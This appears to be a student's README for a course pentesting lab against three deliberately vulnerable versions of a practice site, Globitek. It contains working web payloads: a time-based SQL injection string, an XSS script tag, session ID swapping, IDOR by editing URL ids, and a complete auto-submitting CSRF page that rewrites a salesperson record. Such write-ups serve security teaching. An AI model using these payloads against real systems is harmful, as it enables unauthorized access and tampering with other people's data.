# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

**Vulnerability #1: SQL Injection (SQLi)**

SQL injection performed at: ```public/staff/salespeople/show.php?id=??``` where ?? can be replaced with the SQL command:``` ' OR SLEEP(5)=0--' ```. This SQL injection will cause the SQL query to pause for 5 seconds, showing that the injection was successful. 

*GIF Walkthrough:*

<img src="https://i.imgur.com/wiqwGZL.gif"/>

**Vulnerability #2: Session Hijacking/Fixation**

We are able to log into the Blue site by changing it’s sessionID to match the Green’s site sessionID using the given tool: ```public/hacktools/change_session_id.php ```. From that we are able to change the sessionID to the sessionID we retrieved from the victim and thus logging us into the Blue site.

*GIF Walkthrough:*

<img src="https://i.imgur.com/oThx2fc.gif"/>


## Green

**Vulnerability #1: Cross-Site Scripting (XSS)**

An attacker is able to inject an XSS in the feedback form by inserting the following: ``` <script>alert('XSS TRICK OR TREAT!');</script> ```. The script will run once the account user clicks on the feedback page. 

*GIF Walkthrough:*

<img src="https://i.imgur.com/KHgVZw0.gif"/>

**Vulnerability #2: Username Enumeration**

The Green site shows the Username Enumeration error when the “Log in was unsuccessful.” Message differs for when the Username exists/doesn’t exist. For usernames that exist, the unsuccessful login message will be bolded whereas for usernames that don’t exist the message will not be bolded.

*GIF Walkthrough:*

<img src="https://i.imgur.com/8urOtsO.gif"/>


## Red

**Vulnerability #1: Insecure Direct Object Reference**

An attacker is able to gain access to user accounts that are meant to be hidden/not available for viewing. This is possible by modifying the “id” field in the URL to alter the GET request. The two accounts that are not supposed to be viewed are the individuals with ID 10 and 11.

*GIF Walkthrough:*

<img src="https://i.imgur.com/mJbsD6j.gif"/>


**Vulnerability #2: Cross-Site Request Forgery (CSRF)**

A malicious HTML page was created that will use a user’s session to forge a request to the database. The HTML page secretly creates a post request on page load with the outcome in a hidden iframe. From this, a user in the Salesperson database was modified.

The following was the code to create the HTML page that would modify a user's information in Salesperson database once a person accessed the page.
```html
<html>
  <head>
    <title>Trick or Treat!</title>
  </head>
  <body onload="document.my_form.submit()">
    <h1 align="center">Happy Halloween from Globitek! </h1>
    <p align="center"><b> You just got TRICKED!<b></p>
    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="TRICKED" />
      <input type="text" name="last_name" value="RIP_Mr.Barker" />
      <input type="text" name="phone" value="666-666-6666" />
      <input type="text" name="email" value="TRICKED@TREAT.COM" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```

*GIF Walkthrough:* 

<img src="https://i.imgur.com/WY6mK55.gif"/>

## Notes

Describe any challenges encountered while doing the work

